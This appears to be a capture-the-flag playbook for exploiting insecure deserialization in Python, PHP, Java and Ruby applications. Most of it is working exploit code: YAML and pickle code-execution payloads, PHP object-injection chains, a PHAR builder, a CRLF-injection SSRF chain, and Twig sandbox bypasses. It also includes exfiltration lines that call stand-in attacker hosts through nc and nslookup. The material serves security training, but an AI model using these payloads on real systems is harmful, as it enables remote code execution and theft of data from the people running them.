## Insecure Deserialization Playbook

### Step 0 — Identify the format
Look at source for these sinks (each has a different exploit primitive):

| Language | Sink | Marker bytes / format |
|----------|------|------------------------|
| Python   | `pickle.loads`, `cPickle.loads`, `dill.loads`, `shelve.open` | `\x80\x04`, `cos\nsystem\n` |
| Python   | `yaml.load(...)` (no `SafeLoader`) | `!!python/object`, `!!python/object/apply` |
| Python   | `marshal.loads`, `jsonpickle.decode` | varies |
| PHP      | `unserialize($x)` or `phar://` wrapper | `O:N:"Class":...`, `a:N:{...}` |
| Java     | `ObjectInputStream.readObject` | `\xac\xed\x00\x05` (`rO0` in base64) |
| Ruby     | `Marshal.load`, `YAML.load` | `\x04\x08`, `--- !ruby/object:` |
| Node     | `node-serialize.unserialize` | `_$$ND_FUNC$$_` |

Always look in **cookies, hidden form fields, query params** — server-side blobs are usually base64'd.

### Step 1 — Confirm with a benign payload
Round-trip the existing cookie/blob first. Decode (base64 → bytes), pretty-print, identify class names, mutate one byte, re-encode, and confirm the server re-parses without error.

### Step 2 — RCE primitives by language

#### Python YAML (`yaml.load(..., Loader=Loader)`)
```yaml
# Direct RCE — easiest
!!python/object/apply:os.system ["cat /flag.txt > /app/static/f.txt"]

# Capture output (works because subprocess.check_output returns bytes that
# get rendered into the response)
!!python/object/new:subprocess.check_output [["cat","/flag.txt"]]

# Pure stdlib variant (no subprocess attribute access required)
!!python/object/apply:os.popen ["cat /flag.txt"]

# If the cookie is wrapped (base64 then yaml), wrap accordingly
```
Full Python exploit when the cookie is base64(yaml) and the user object is keyed by a session cookie:
```python
import requests, base64
base = "http://TARGET"
s = requests.Session()
s.get(base + "/list")  # seed user/bookmarks cookies

# Side-channel: write flag to a static file the app serves
payload = (
    '!!python/object/apply:os.system\n'
    '- "cat /flag.txt > /app/website/app/static/f.txt 2>&1"\n'
)
# Some apps store via app/static at a different prefix — try both:
candidate_static_dirs = [
    "/app/website/app/static",
    "/app/static",
    "/var/www/html/static",
    "/tmp",
]
for d in candidate_static_dirs:
    p = f'!!python/object/apply:os.system\n- "cat /flag.txt > {d}/f.txt 2>&1"\n'
    s.cookies.set("bookmarks", base64.b64encode(p.encode()).decode())
    s.get(base + "/list")
    for static_url in ["/static/f.txt", "/app/static/f.txt", "/f.txt"]:
        r = requests.get(base + static_url)
        if "FLAG{" in r.text or "flag{" in r.text.lower():
            print("FLAG:", r.text)
            raise SystemExit
print("No flag yet — try /list response body for a leaked render")
```
**If the app DOES NOT have a writable static dir**, exfil through the response itself:
```python
# Replace bookmarks list with a single string containing the flag —
# the template renders u.name / u.url, so set those to the flag content
payload = (
    '!!python/object/new:subprocess.check_output\n'
    '- ["sh","-c","cat /flag.txt"]\n'
)
# This makes urls = b"FLAG{...}\n"; the template will iterate over bytes
# (per char) which still surfaces the bytes in the HTML.
```
**Or**, the simplest universal trick: **OOB DNS exfil** via `os.system("nslookup $(cat /flag.txt | base64).attacker")`. We don't have an attacker DNS server here, so skip OOB unless you've configured one.

#### Python pickle (cookies, redis, msgpack)
```python
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt > /app/static/f.txt",))
print(base64.b64encode(pickle.dumps(P())).decode())
```

#### PHP `unserialize` / phar
The phar wrapper triggers `__wakeup`/`__destruct` on any class loaded by the autoloader. Pattern:
1. Find a class with a dangerous magic method (`__wakeup`, `__destruct`, `__toString`).
2. Build a phar locally with that serialized object as metadata.
3. Upload the phar (often disguised as `.jpg` through an `arbitrary_file_upload` sink).
4. Trigger via `phar://` wrapper in any file function (`file_exists`, `file_get_contents`, `unlink`, `include`).

Generator (run inside the Kali container):
```php
<?php
class CustomTemplate {           // mirror the class name and properties exactly
    public $template = "x";
    public $data = "system('cat /flag.txt');";
}
@unlink("/tmp/exploit.phar");
$phar = new Phar("/tmp/exploit.phar");
$phar->startBuffering();
$phar->addFromString("manifest", serialize(new CustomTemplate()));
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
echo base64_encode(file_get_contents("/tmp/exploit.phar"));
```
Build needs `phar.readonly = Off` (`php -d phar.readonly=0 build.php`).
Then POST the base64 to the upload endpoint, then trigger via `?file_path=/tmp/HASH.jpg`. The flag appears in the response (`output` field) because `eval($this->data)` runs.

If the upload uses SSRF/restricted URL parsing, upload directly to the backend service: `curl -F data=$(base64 phar) http://INTERNAL_BACKEND:PORT/upload_endpoint` — but you'll need to route through the SSRF endpoint. Check the URL parser carefully for parser-confusion bypasses (`@`, `#`, double slashes).

#### PHP raw `unserialize($_COOKIE[...])` — POP chain
Same idea but no phar needed. Build the serialized object directly: `O:14:"CustomTemplate":2:{s:8:"template";s:1:"x";s:4:"data";s:24:"system('cat /flag.txt');";}` and put it in the cookie/param. URL-encode special chars.

#### Java
```bash
# Generate with ysoserial (already in Kali image)
ysoserial CommonsCollections5 'sh -c "cat /flag.txt | nc ATTACKER 9999"' | base64 -w0
# Submit base64 in the cookie/POST field that hits ObjectInputStream
```

#### Ruby
```ruby
# Marshal RCE
require 'erb'; e = ERB.new('<%= `cat /flag.txt` %>'); Marshal.dump(e)
```

### Step 3 — Verify and exfil
- After RCE primitive fires, prefer **side-channel writes** to a web-accessible directory over OOB callbacks (no attacker infra needed).
- Try ALL these write targets: `/app/static/`, `/app/website/app/static/`, `/var/www/html/`, `/tmp/`, `/app/templates/`.
- Then GET each via the obvious URL prefix until you see `FLAG{`.

### Common pitfalls
- `yaml.safe_load` is NOT exploitable — verify the loader is `Loader`, `FullLoader`, or `UnsafeLoader`.
- Pickle payloads must match the protocol the app uses (`pickle.loads` is permissive; `pickle.Unpickler` with `find_class` override may block builtins).
- PHP `__wakeup` is skipped on `unserialize` if the property count in the serialized string is wrong (CVE-2016-7124). Useful when the target only has a vulnerable `__destruct`.
- Twig's sandbox blocks function calls but allows `constant`, `range`, `cycle`, `dump`, `include` by default. `{{ ['id']|filter('system') }}` and `{{ ['id']|map('system')|join('') }}` are common bypass attempts — check the policy in source.

### Pattern F — PHP PHAR + `unserialize` chain via SSRF

When you find a multi-tier PHP app where:
- An outer service exposes URL-fetch SSRF restricted to an internal `host:port`
- The internal service has `file_get_contents('phar://' . $userPath . '/manifest')` then `unserialize()` (or any `phar://` filesystem call on user-supplied paths)
- A class with `__wakeup`/`__destruct`/`__toString` containing `eval()`/`system()`/`exec()` is autoloaded

…the chain is **upload PHAR → trigger phar:// → unserialize → magic method RCE**.

#### Step 1 — Read source for the gadget class
Look for `__wakeup`, `__destruct`, `__toString`, `__call`, `__invoke`, `__get`. The first three fire automatically on `unserialize`/destruction/string-cast. Example sink:

```php
class CustomTemplate {
    public $template; public $data;
    public function __wakeup() { eval($this->data); }   // ← fires on unserialize()
}
```

#### Step 2 — Build the PHAR locally (do NOT need PHP on attacker box)
A PHAR file is `<stub>__HALT_COMPILER();<metadata>` where `metadata` is the serialized object.
You can hand-craft one in Python without PHP installed:

```python
import struct, zlib, hashlib

# Serialized PHP object: O:14:"CustomTemplate":2:{s:8:"template";s:0:"";s:4:"data";s:NN:"PAYLOAD";}
payload = 'system("cat /flag.txt > /tmp/o.txt; cat /tmp/o.txt");'
serialized = (
    f'O:14:"CustomTemplate":2:'
    f'{{s:8:"template";s:0:"";s:4:"data";s:{len(payload)}:"{payload}";}}'
).encode()

# PHAR stub + manifest + signature
stub = b'<?php __HALT_COMPILER(); ?>\r\n'
# Manifest format: api_version (2 bytes), global_flags (4), alias_len (4), alias, metadata_len (4), metadata,
# files_count (4), then per-file entries. We use 1 dummy file "manifest" so the path phar://x/manifest works.
filename = b'manifest'
file_contents = b''  # empty
file_meta = b''
file_entry = (
    struct.pack('<I', len(filename)) + filename +
    struct.pack('<I', len(file_contents)) +     # uncompressed size
    struct.pack('<I', 0) +                       # timestamp
    struct.pack('<I', len(file_contents)) +     # compressed size
    struct.pack('<I', zlib.crc32(file_contents) & 0xffffffff) +
    struct.pack('<I', 0x00000010) +              # flags: STORE
    struct.pack('<I', len(file_meta)) + file_meta
)
manifest_body = (
    struct.pack('<I', 1) +                       # files_count
    b'\x11\x00' +                                # api version 0x1100
    struct.pack('<I', 0x00010000) +              # global flags (signature present)
    struct.pack('<I', 0) +                       # alias_len
    struct.pack('<I', len(serialized)) + serialized +
    file_entry
)
manifest = struct.pack('<I', len(manifest_body)) + manifest_body
body = stub + manifest + file_contents
sig = hashlib.sha1(body).digest() + struct.pack('<I', 0x0002) + b'GBMB'  # SHA1 sig type
phar = body + sig

import base64
print(base64.b64encode(phar).decode())
```
**Easier**: if Docker is available locally, run a one-shot PHP container with `phar.readonly = Off`:
```bash
docker run --rm -v $PWD:/w -w /w php:8.0-cli sh -c '
  echo "phar.readonly = Off" > /usr/local/etc/php/conf.d/phar.ini
  php -d phar.readonly=0 -r "
    class CustomTemplate { public \$template=\"\"; public \$data; }
    \$o = new CustomTemplate(); \$o->data = \"system(\\\"cat /flag.txt\\\");\";
    \$p = new Phar(\"x.phar\"); \$p->startBuffering();
    \$p->addFromString(\"manifest\", \"\");
    \$p->setMetadata(\$o); \$p->setStub(\"<?php __HALT_COMPILER(); ?>\");
    \$p->stopBuffering();
  "
  base64 -w0 x.phar
'
```

#### Step 3 — Bypass the SSRF restrictions to inject custom POST body

If outer SSRF hardcodes the body (e.g. `http_build_query(['param1'=>'value1'])`), use **CRLF injection in the URL** to terminate the PHP HTTP wrapper's request and inject a fresh POST.
PHP's `http://` stream wrapper urldecodes the path before building the request line, so `%0d%0a` in the URL splits the request:

```python
import requests, base64, urllib.parse
phar_b64 = "..."  # from step 2

# Inject our own POST to /sku_process to upload the PHAR as base64 → /tmp/{hash}.jpg
crlf = "\r\n"
body = f"data={urllib.parse.quote(phar_b64)}"
inject = (
    f"/sku_process HTTP/1.1{crlf}"
    f"Host: internal-service:4455{crlf}"
    f"Content-Type: application/x-www-form-urlencoded{crlf}"
    f"Content-Length: {len(body)}{crlf}{crlf}"
    f"{body}{crlf}"
    f"GET /ignored"  # consume the original trailer
)
url = "http://localhost:4455" + urllib.parse.quote(inject, safe="")
r = requests.post("http://TARGET:8081/sku_url.php", data={"url": url}, timeout=30)
# Response will contain {"file_path":"/tmp/abc.jpg",...} from sku_process
```

Then trigger phar:// with a second SSRF call to `/read_sku.php` posting `file_path=/tmp/abc.jpg` (same CRLF technique).

#### Pitfalls
- `__HALT_COMPILER();` MUST be present in the stub or PHP refuses to load the PHAR.
- `phar.readonly = On` (default in modern PHP) blocks PHAR *creation* via the Phar API but NOT *reading* — your built file works fine on the target.
- Property count in serialized string must match the actual object. CVE-2016-7124: setting count > actual skips `__wakeup` (use this to fire `__destruct` only).
- The file extension does NOT matter for `phar://` — `.jpg`, `.png`, `.txt` all work.
- `file_exists($path)` followed by `phar://$path/anything` triggers metadata unserialize on most PHP versions even without the `phar://` call (CVE chain pre-PHP 8.0). On PHP 8.0+ only the explicit `phar://` wrapper triggers it.
